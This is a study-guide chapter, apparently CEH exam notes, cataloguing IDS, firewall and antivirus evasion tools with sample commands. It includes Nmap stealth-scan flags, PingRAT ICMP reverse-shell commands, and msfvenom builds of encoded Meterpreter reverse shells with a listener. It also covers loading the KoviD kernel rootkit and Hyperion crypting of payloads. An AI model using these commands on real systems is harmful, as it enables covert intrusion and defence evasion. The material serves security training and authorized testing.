# 07 — Evasion Tools

[⬅ Back to main index](../README.md)

> This section catalogs the specific tools referenced in CEH Module 12 for evading IDS, firewalls, and endpoint defenses. Each entry covers what the tool does, what category of evasion it falls under, and representative commands where applicable. These are all real, publicly available tools used legitimately in **authorized** penetration testing and security research.

## Table of Contents
- [Traffic Generation and Packet Crafting Tools](#traffic-generation-and-packet-crafting-tools)
  - [Colasoft Packet Builder](#colasoft-packet-builder)
  - [NetScanTools Pro](#netscantoolspro)
  - [CommView](#commview)
  - [Ostinato](#ostinato)
  - [WAN Killer](#wan-killer)
  - [WireEdit](#wireedit)
- [Network Scanning and Evasion Tools](#network-scanning-and-evasion-tools)
  - [Nmap](#nmap)
  - [PingRAT](#pingrat)
  - [Green Tunnel](#green-tunnel)
- [Payload and Exploit Tools](#payload-and-exploit-tools)
  - [Metasploit Framework](#metasploit-framework)
  - [Traffic IQ Professional](#traffic-iq-professional)
- [Rootkit and Kernel-Level Evasion](#rootkit-and-kernel-level-evasion)
  - [KoviD](#kovid)
- [Encoding and Obfuscation Tools](#encoding-and-obfuscation-tools)
  - [Hyperion](#hyperion)
- [Tool Comparison Table](#tool-comparison-table)

---

## Traffic Generation and Packet Crafting Tools

These tools create raw, customized network packets — used by defenders to test whether their IDS/firewall rules trigger correctly and by pen testers to probe security controls during authorized assessments.

### Colasoft Packet Builder

A Windows-based packet crafting tool that allows the creation of custom network packets with fine-grained control over every field in the protocol header. Used to test IDS signatures and firewall rules by crafting packets that should (or shouldn't) trigger them.

**Key features:**
- Supports ARP, IP, TCP, UDP, ICMP packets at the raw level
- Edit any byte in any header field — source/destination MAC, IP TTL, TCP flags, sequence numbers, checksums
- Create packet lists and send them at defined intervals or burst rates
- Import and export packet captures in `.pcap` format — load a Wireshark capture, modify packets, and replay them
- Built-in decode panel shows protocol breakdown in real time

**Workflow for IDS rule testing:**
```
1. Create a packet that should match an IDS rule (e.g., TCP SYN to port 23 = Telnet)
2. Send it → confirm IDS fires the expected alert
3. Modify the packet (fragment it, change TTL, split the payload across segments)
4. Resend → verify the IDS still fires (or document the evasion gap if it doesn't)
```

**Download:** https://www.colasoft.com/packet_builder/

---

### NetScanTools Pro

A comprehensive Windows-based network investigation toolkit covering packet generation, DNS reconnaissance, service fingerprinting, and more.

**Relevant capabilities for evasion testing:**

```
Packet Flooder:
  - Generates continuous UDP or TCP floods
  - Configurable packet size and send rate
  - Useful for testing firewall rate-limiting and IDS flood detection

Packet Generator:
  - Custom packet construction (all protocol headers)
  - Supports fragmented packet sending — tests IDS fragment reassembly
  - Configurable inter-packet delay

Port Scanner:
  - TCP connect / SYN / UDP / ICMP scans
  - Custom port ranges, randomized port order (harder to distinguish
    from background noise than sequential scanning)
```

**Download:** https://www.netscantools.com/

---

### CommView

A network monitor and analyzer for Windows that captures and analyzes all packets on a local LAN or WAN connection. Primarily used for traffic analysis but includes a built-in **Packet Generator** for crafting and sending custom packets.

**Key capabilities:**
- View all captured packets with full protocol decode (Ethernet, IP, TCP, UDP, DNS, HTTP, etc.)
- Filter by protocol, address, port, or custom rules
- Reconstruct TCP sessions — see the full request/response as the application would
- **Packet Generator:** create custom frames from scratch or modify captured packets and replay them — directly useful for testing whether a specific packet pattern triggers firewall/IDS rules

**Download:** https://www.tamos.com/products/commview/

---

### Ostinato

An open-source, cross-platform packet generator and traffic generator with a modern GUI and a Python API for scripted traffic generation.

**Key features:**
- Define packet streams with precise control over every protocol field
- Variable/incrementing fields — automatically iterate source IPs, destination ports, or payload content across a stream
- Configurable send rate (packets per second or line rate)
- Import/export pcap files
- Python scripting API (`ostinato` Python module) for automated test cases

```python
# Ostinato Python API — programmatically create and send a packet stream
from ostinato.core import ost_pb, DroneProxy
from ostinato.protocols.mac_pb2 import mac
from ostinato.protocols.ip4_pb2 import ip4
from ostinato.protocols.tcp_pb2 import tcp

drone = DroneProxy('127.0.0.1')
drone.connect()

# Get port list
port_id_list = drone.getPortIdList()
port_config_list = drone.getPortConfig(port_id_list)

# Create a stream
stream_id = ost_pb.StreamIdList()
stream_id.port_id.CopyFrom(port_id_list.port_id[0])
stream_id.stream_id.add().id = 1

sc = drone.getStreamConfig(stream_id)
sc.stream[0].core.is_enabled = True
sc.stream[0].core.pps = 100   # 100 packets per second

# Add IP layer — set source/destination
ip_hdr = sc.stream[0].protocol.add()
ip_hdr.protocol_id.id = ost_pb.Protocol.kIp4FieldNumber

drone.modifyStream(sc)
drone.startTransmit(port_id_list)
```

**Download:** https://ostinato.org/

---

### WAN Killer

Part of the SolarWinds Engineer's Toolset — generates custom network traffic at high volume across WAN links. Used by network engineers to stress-test bandwidth and QoS configurations, and by pen testers to test whether traffic-volume-based IDS triggers work.

**Key features:**
- Adjustable packet size (64 bytes to 1500 bytes)
- Adjustable send rate (percentage of link bandwidth or absolute Mbps)
- Target any IP address and port
- Uses UDP by default (no connection state, maximum throughput)

**Primary use in evasion context:** flooding the IDS sensor with legitimate-looking high-volume traffic to saturate its processing capacity before launching the real attack (see [IDS Flooding](../06-evasion-and-bypass-techniques/06b-ids-evasion/README.md#18-flooding)).

---

### WireEdit

A full-stack WYSIWYG network packet editor — the only tool of its kind that lets you directly edit any field of any protocol in a pcap file through a graphical interface, without needing to know the byte offsets manually.

**Key features:**
- Opens `.pcap` files directly — edit any field in any protocol header with point-and-click
- Understands the protocol hierarchy — editing a length field automatically offers to recalculate checksums
- Supports Ethernet, IP, IPv6, TCP, UDP, ICMP, HTTP, DNS, DHCP, and many more
- Save modified packets back to pcap — reload in Wireshark or replay with `tcpreplay`

**Workflow for IDS evasion testing:**
```
1. Capture a known-malicious traffic sample (from a lab, from a threat feed)
   → save as pcap
2. Open in WireEdit
3. Modify specific bytes to test evasion:
   - Fragment IP packets by adjusting fragment offset field
   - Set TTL to a low value to test TTL-based IDS evasion
   - Flip TCP flags (ACK-only packets for ACK tunnel testing)
   - Obfuscate payload content
4. Save as modified.pcap
5. Replay: tcpreplay -i eth0 modified.pcap
6. Check whether the IDS fired — and if not, what exactly caused the miss
```

**Download:** https://www.wireedit.com/

---

## Network Scanning and Evasion Tools

### Nmap

Nmap (Network Mapper) is the industry-standard open-source tool for network discovery and security auditing. It is the primary tool used for **port scanning, service version detection, OS fingerprinting, and firewall rule enumeration**.

**IDS/Firewall evasion-specific Nmap techniques:**

```bash
# === Timing evasion — scan slowly to avoid rate-based detection ===
nmap -T0 <target>       # Paranoid: 5-minute delay between probes (very slow)
nmap -T1 <target>       # Sneaky: 15-second delay
nmap -T2 <target>       # Polite: 0.4-second delay

# === Packet fragmentation — bypass shallow packet inspection ===
nmap -f <target>        # Fragment into 8-byte IP fragments
nmap -f -f <target>     # 16-byte fragments (smaller = more likely to evade)
nmap --mtu 24 <target>  # Set custom fragment MTU (must be multiple of 8)

# === Decoy scanning — hide real attacker IP among fake source IPs ===
nmap -D RND:10 <target>         # Generate 10 random decoy IPs
nmap -D 192.168.1.5,10.0.0.1,ME <target>  # Named decoys + attacker's real IP

# === Source port manipulation — spoof source port to bypass rules ===
nmap --source-port 53 <target>  # Look like DNS traffic
nmap --source-port 80 <target>  # Look like web traffic
nmap -g 443 <target>            # Same thing (-g is shorthand for --source-port)

# === Append random data to evade length-based signatures ===
nmap --data-length 25 <target>  # Add 25 random bytes to each packet

# === Spoof MAC address (useful on local network) ===
nmap --spoof-mac 0 <target>     # Random MAC
nmap --spoof-mac Apple <target> # Spoof as Apple device (uses Apple OUI)

# === Idle/Zombie scan — completely hide attacker's IP ===
# Find a "zombie" host (idle machine with predictable IP ID sequence)
nmap -O -v <zombie_candidate>
# Then use it: nmap -sI <zombie_ip>:<port> <target>
nmap -sI 192.168.1.50 <target>  # Scan target using zombie's IP — attacker invisible

# === Script-based firewall bypass ===
nmap --script firewall-bypass <target>
nmap --script firewalk <target>         # Determine firewall rules via TTL probing

# === FIN/NULL/XMAS scans — bypass stateless ACL rules ===
nmap -sF <target>   # FIN scan (only FIN flag set — no SYN)
nmap -sN <target>   # NULL scan (no flags)
nmap -sX <target>   # XMAS scan (FIN+PSH+URG)
```

---

### PingRAT

A covert C2 (Command and Control) channel tool that uses **ICMP echo (ping) packets** to pass commands to a victim machine and receive output back — tunneling C2 communication inside what looks like ordinary ping traffic.

```bash
# SERVER side (attacker's machine, receives reverse shell via ICMP)
sudo ./pingRAT -s -i eth0

# CLIENT side (victim machine, connects back to attacker over ICMP)
sudo ./pingRAT -c <attacker_IP> -i eth0

# The victim now accepts commands sent as ICMP payloads
# and returns output as ICMP echo reply payloads
# Firewalls see only ICMP ping traffic — the C2 channel is invisible
```

**GitHub:** https://github.com/graniet/PingRAT

**Why it evades detection:**
- ICMP is allowed through almost every firewall (needed for `ping` diagnostics)
- Payload inspection of ICMP is rare — most IDS rules focus on TCP/UDP
- Traffic looks exactly like normal ping activity
- No TCP/UDP ports involved — port-based firewall rules don't apply

---

### Green Tunnel

An anti-censorship proxy tool that bypasses DNS-based and SNI-based internet censorship by exploiting the fact that Deep Packet Inspection (DPI) filters — the same technology used in corporate firewalls — often fail to process deliberately fragmented or malformed handshake packets.

```bash
# Install (Node.js required)
npm install -g green-tunnel

# Run with default settings (auto-detects censorship method)
gt

# Specify DNS over HTTPS provider
gt --dns-type doh --dns-server https://cloudflare-dns.com/dns-query

# Specify IP fragmentation (splits TLS ClientHello across fragments)
gt --ip-frag true

# Specify custom SNI for server name obfuscation
gt --sni-mode serverhello
```

**GitHub:** https://github.com/SadeghHayeri/GreenTunnel

**How it works (technically):**
1. Intercepts HTTPS connections before they leave the machine
2. Deliberately **fragments the TLS ClientHello packet** — the packet that contains the Server Name Indication (SNI) field DPI filters use to identify blocked sites
3. The DPI filter receives an incomplete ClientHello → cannot extract the SNI → cannot match the block rule → lets the traffic through
4. The real HTTPS server receives all the fragments, reassembles them, and processes the connection normally

---

## Payload and Exploit Tools

### Metasploit Framework

Metasploit is the industry-standard open-source penetration testing framework. Its relevance here is specifically its **payload encoding and evasion capabilities** (the full framework does much more than this).

**Key evasion-relevant features:**

```bash
# Launch Metasploit console
msfconsole

# List all available payload encoders
msfvenom --list encoders
# Notable encoders:
#   x86/shikata_ga_nai    (rated 'excellent' — polymorphic XOR)
#   x64/xor_dynamic       (64-bit XOR)
#   x86/countdown         (countdown-based encoder)
#   cmd/powershell_base64 (Base64 PowerShell encoder)

# Generate a basic Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f exe > shell.exe

# Generate with encoder (polymorphic — different signature each run)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -e x86/shikata_ga_nai -i 7 \   # encode 7 iterations
  -f exe > encoded_shell.exe

# Generate shellcode for injection (raw bytes, no PE wrapper)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f raw > shellcode.bin

# Generate Python shellcode (for embedding in scripts)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 \
  -f py -v shellcode

# Custom PE template (change PE structure to break signatures — see Module 12)
msfvenom -p windows/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=444 \
  -x custom_template.exe \
  -f exe > bypass.exe

# Set up the listener (handler) to receive the connection
msfconsole -q -x "
  use exploit/multi/handler;
  set payload windows/meterpreter/reverse_tcp;
  set LHOST 192.168.1.100;
  set LPORT 4444;
  set ExitOnSession false;
  exploit -j
"
```

---

### Traffic IQ Professional

A specialized network security testing tool designed to generate specific, realistic network attack traffic for testing whether IDS/IPS systems correctly detect and respond to it.

**Key features:**
- Library of **pre-built attack traffic profiles** — simulate specific exploits, worms, port scans, DoS attacks, and protocol anomalies
- **Replay** captured attack traffic from pcap files with timing preserved
- Test IDS alert accuracy — measure **true positive rate** (did the IDS fire for every attack?) and **false positive rate** (did it fire on the benign traffic baseline?)
- Evaluate IDS performance under load — combine high-volume benign traffic with attack traffic to see if the IDS degrades
- Generate **compliance-testing reports** documenting IDS coverage and response times

**Use case:** After deploying a new IDS rule set, run Traffic IQ Pro to send known-attack traffic through and verify which attacks are caught, which are missed, and at what traffic volume the detection starts degrading.

---

## Rootkit and Kernel-Level Evasion

### KoviD

KoviD is a Linux kernel rootkit (Loadable Kernel Module — LKM) designed specifically to evade modern EDR, AV, and forensic tools by operating entirely at **kernel level** — below the reach of user-space security tools.

**Capabilities:**

| Capability | How it works |
|---|---|
| **Process hiding** | Removes target process entries from `/proc` — `ps`, `top`, `htop` cannot see the hidden process |
| **File/directory hiding** | Hooks `getdents64` syscall — any file with a magic prefix becomes invisible to `ls`, `find` |
| **Network connection hiding** | Hooks `/proc/net/tcp` — the malicious connection does not appear in `ss` or `netstat` |
| **LKM hiding** | Removes itself from the kernel module list — `lsmod` cannot see it |
| **Privilege escalation** | Grants root privileges to any process via a magic command |
| **Command execution** | Runs commands as root from a remote source |
| **Persistence** | Re-loads itself across reboots by hooking the init process |
| **Anti-forensics** | Scrambles its own memory footprint to confuse kernel memory analysis tools |

```bash
# Compile (on matching kernel version — attacker's controlled machine)
make

# Load the rootkit module (requires root)
sudo insmod kovid.ko

# After loading: the module hides itself
lsmod | grep kovid   # returns nothing — hidden

# Interact via magic packets or a pre-configured backdoor channel
# All activity is hidden from ps, netstat, ls, lsmod
```

**GitHub:** https://github.com/carloslack/KoviD

> **Defensive note:** Kernel-level rootkits like KoviD are detectable only by techniques that operate at or below the kernel level — hardware-based memory analysis, hypervisor introspection, or by comparing kernel data structures directly (e.g., comparing the running process list from the kernel's perspective vs `/proc` — a discrepancy = rootkit hiding a process).

---

## Encoding and Obfuscation Tools

### Hyperion

Hyperion is a runtime encryptor for Windows PE (portable executable) files — a tool for obfuscating executables to evade AV/EDR signature detection.

**How it works:**
1. Takes a normal Windows executable (e.g., a Metasploit shell) as input
2. **Encrypts** the executable's content with a randomly generated AES-128 key
3. **Brute-forces** the AES key at runtime — embeds a tiny brute-force routine inside the wrapper that finds the correct key when the executable runs
4. Because the key is brute-forced at runtime (not stored in plaintext), static analysis cannot extract it — the encrypted blob looks like random data to a scanner

```bash
# Hyperion runs on Windows (wine on Linux)
# Step 1: compile or download Hyperion
# Step 2: encrypt the payload
wine Hyperion.exe original_payload.exe encrypted_payload.exe

# The encrypted_payload.exe is now different bytes from the original
# On execution:
#   - The brute-force routine runs (typically <1 second for AES-128 half-space)
#   - Finds the correct key
#   - Decrypts original_payload.exe in memory
#   - Executes the decrypted code directly in memory (no file written to disk)
```

**GitHub:** https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion

**Why it works:** AV/EDR scanners compare file bytes (or their hash) against known signatures. Hyperion produces a different encrypted file every time — the signature never matches. The real payload only exists in memory (decrypted) during execution, which static analysis cannot reach.

---

## Tool Comparison Table

| Tool | Category | Platform | Primary Use | Open Source |
|---|---|---|---|---|
| Colasoft Packet Builder | Packet crafting | Windows | Create/send custom packets, test firewall rules | ❌ (trial) |
| NetScanTools Pro | Network scanning + flooding | Windows | Multi-function network testing | ❌ (commercial) |
| CommView | Packet capture + generator | Windows | Traffic analysis, packet replay | ❌ (commercial) |
| Ostinato | Packet generation | Cross-platform | Scripted traffic generation, rate testing | ✅ |
| WAN Killer | Traffic flooding | Windows | Bandwidth saturation, IDS flood testing | ❌ (SolarWinds) |
| WireEdit | Packet editing | Linux | Edit pcap files byte-level, replay modified traffic | ❌ (freemium) |
| Nmap | Port scanning | Cross-platform | Firewall rule mapping, evasive scanning | ✅ |
| PingRAT | ICMP C2 | Linux | Covert C2 over ICMP | ✅ |
| Green Tunnel | Anti-censorship | Cross-platform | Bypass DPI-based filtering | ✅ |
| Metasploit | Exploit framework | Cross-platform | Payload generation, encoding, evasion | ✅ |
| Traffic IQ Professional | IDS testing | Windows | Validate IDS alert coverage | ❌ (commercial) |
| KoviD | Kernel rootkit | Linux | Kernel-level process/file/network hiding | ✅ (research) |
| Hyperion | PE encryptor | Windows | Obfuscate executables to evade AV | ✅ |

---

[⬅ Back to main index](../README.md) · [➡ Next: Countermeasures](../08-countermeasures/README.md)
